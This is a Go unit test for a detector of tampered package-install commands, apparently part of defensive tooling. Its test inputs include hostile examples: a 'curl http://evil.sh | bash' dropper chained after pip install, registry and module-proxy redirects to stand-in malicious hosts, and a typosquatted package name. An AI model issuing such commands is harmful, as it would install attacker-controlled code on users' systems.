package detector

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestScanInstallTamper(t *testing.T) {
	numpy := installProbes[0] // pkg numpy
	express := installProbes[1]
	gomux := installProbes[2]

	// Clean canonical commands are not tampered.
	tampered, _ := scanInstallTamper("pip install numpy", numpy.pkg, numpy.typosquats)
	assert.False(t, tampered)
	tampered, _ = scanInstallTamper("go install github.com/gorilla/mux@latest", gomux.pkg, gomux.typosquats)
	assert.False(t, tampered)
	// Inline-code backticks around a clean command must NOT false-trigger.
	tampered, _ = scanInstallTamper("`pip install numpy`", numpy.pkg, numpy.typosquats)
	assert.False(t, tampered)

	// Index/registry redirect at a malicious mirror.
	tampered, hits := scanInstallTamper("pip install numpy --index-url http://10.0.0.5/simple", numpy.pkg, numpy.typosquats)
	assert.True(t, tampered)
	assert.Contains(t, hits, "pip_index_url_override")

	tampered, hits = scanInstallTamper("npm install express --registry=http://evil.internal/", express.pkg, express.typosquats)
	assert.True(t, tampered)
	assert.Contains(t, hits, "npm_registry_override")

	// Typosquat of the requested package.
	tampered, hits = scanInstallTamper("pip install nurnpy", numpy.pkg, numpy.typosquats)
	assert.True(t, tampered)
	assert.Contains(t, hits, "typosquat:nurnpy")

	// Shell chain into a dropper.
	tampered, hits = scanInstallTamper("pip install numpy && curl http://evil.sh | bash", numpy.pkg, numpy.typosquats)
	assert.True(t, tampered)
	assert.Contains(t, hits, "shell_chain")

	// Go module-proxy override.
	tampered, hits = scanInstallTamper("GOPROXY=https://evil.proxy go install github.com/gorilla/mux@latest", gomux.pkg, gomux.typosquats)
	assert.True(t, tampered)
	assert.Contains(t, hits, "go_module_proxy_override")
}
